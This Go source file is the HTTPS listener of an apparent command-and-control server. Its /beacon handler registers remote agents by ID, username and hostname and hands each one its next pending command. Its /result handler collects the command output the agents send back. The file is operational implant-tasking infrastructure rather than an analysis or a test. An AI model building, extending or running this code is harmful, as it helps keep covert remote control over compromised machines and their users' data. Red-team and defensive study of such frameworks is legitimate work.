package main

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/RodKast/go-c2/pkg/agent"
)

func startHTTPSListener(host string, port int) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/beacon", beaconHandler)
	mux.HandleFunc("/result", resultHandler)

	tlsConfig, err := generateTLSConfig()
	if err != nil {
		return err
	}

	server := &http.Server{
		Addr:      fmt.Sprintf("%s:%d", host, port),
		Handler:   mux,
		TLSConfig: tlsConfig,
	}

	return server.ListenAndServeTLS("", "")
}

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "failed to read body", http.StatusInternalServerError)
		return
	}
	parts := strings.Split(strings.TrimSpace(string(body)), ":")
	if len(parts) != 3 {
		http.Error(w, "invalid message format", http.StatusBadRequest)
		return
	}
	agentID := parts[0]
	username := parts[1]
	hostname := parts[2]

	agentMu.Lock()
	a, exists := agents[agentID]
	if !exists {
		a = agent.NewAgent(username, hostname, r.RemoteAddr)
		a.ID = agentID
		agents[agentID] = a
		fmt.Printf("new agent registered: %s@%s (%s)\n", username, hostname, agentID)
	} else {
		a.LastSeen = time.Now()
	}
	agentMu.Unlock()

	for i := range a.Tasks {
		if a.Tasks[i].Status == "pending" {
			a.Tasks[i].Status = "sent"
			fmt.Fprintf(w, "%s", a.Tasks[i].Command)
			return
		}
	}
	fmt.Fprintf(w, "ACK")
}

func resultHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "failed to read body", http.StatusBadRequest)
		return
	}
	parts := strings.SplitN(strings.TrimSpace(string(body)), ":", 2)
	if len(parts) != 2 {
		http.Error(w, "invalid format", http.StatusBadRequest)
		return
	}
	agentID := parts[0]
	output := parts[1]

	agentMu.Lock()
	defer agentMu.Unlock()
	a, exists := agents[agentID]
	if !exists {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}
	for i := range a.Tasks {
		if a.Tasks[i].Status == "sent" {
			a.Tasks[i].Output = output
			a.Tasks[i].Status = "completed"
			w.WriteHeader(http.StatusOK)
			return
		}
	}
}
